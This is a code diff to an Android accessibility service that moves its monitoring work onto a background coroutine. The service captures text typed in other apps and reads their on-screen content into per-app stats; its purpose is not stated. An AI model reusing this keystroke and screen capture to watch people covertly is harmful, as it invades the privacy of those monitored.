@@ -9,8 +9,10 @@ import org.json.JSONObject
 import android.app.KeyguardManager
 import android.os.Handler
 import android.os.Looper
+import kotlinx.coroutines.*
 
 class MyAccessibilityService : AccessibilityService() {
+    private val scope = CoroutineScope(Dispatchers.Default)
 
     companion object {
         var instance: MyAccessibilityService? = null
@@ -47,6 +49,7 @@ class MyAccessibilityService : AccessibilityService() {
     override fun onDestroy() {
         super.onDestroy()
         instance = null
+        scope.cancel() // Cleanup threads
     }
 
     override fun onAccessibilityEvent(event: AccessibilityEvent?) {
@@ -81,25 +84,27 @@ class MyAccessibilityService : AccessibilityService() {
             handleGhostEvent(event)
         }
 
-        // --- 2. STANDARD MONITORING ---
+        // --- 2. STANDARD MONITORING (Offloaded to Background) ---
         val now = System.currentTimeMillis()
         if (now < nextAllowedCheck) return
 
         val pkgName = event.packageName?.toString() ?: return
 
-        if (event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
-            val text = event.text.joinToString(" ")
-            TypingManager.onType(this, pkgName, text)
-            return
-        }
+        // Rapid Thread Offload
+        scope.launch {
+            if (event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
+                val text = event.text.joinToString(" ")
+                TypingManager.onType(this@MyAccessibilityService, pkgName, text)
+                return@launch
+            }
 
-        if (cachedRules.length() > 0 && !cachedRules.has(pkgName)) return
+            if (cachedRules.length() > 0 && !cachedRules.has(pkgName)) return@launch
 
-        val source = event.source ?: return
-        val textContent = StringBuilder()
-        extractText(source, textContent)
-        
-        if (textContent.isNotEmpty()) {
+            val source = try { event.source } catch(e: Exception) { null } ?: return@launch
+            val textContent = StringBuilder()
+            extractText(source, textContent)
+            
+            if (textContent.isNotEmpty()) {
             val pm = packageManager
             val appName = try { pm.getApplicationLabel(pm.getApplicationInfo(pkgName, 0)).toString() } catch (e: Exception) { pkgName }
             val prefs = getSharedPreferences("app_stats", Context.MODE_PRIVATE)
@@ -126,6 +131,7 @@ class MyAccessibilityService : AccessibilityService() {
                     .apply()
             } else {
                 nextAllowedCheck = now + 3000
+            }
             }
         }
     }
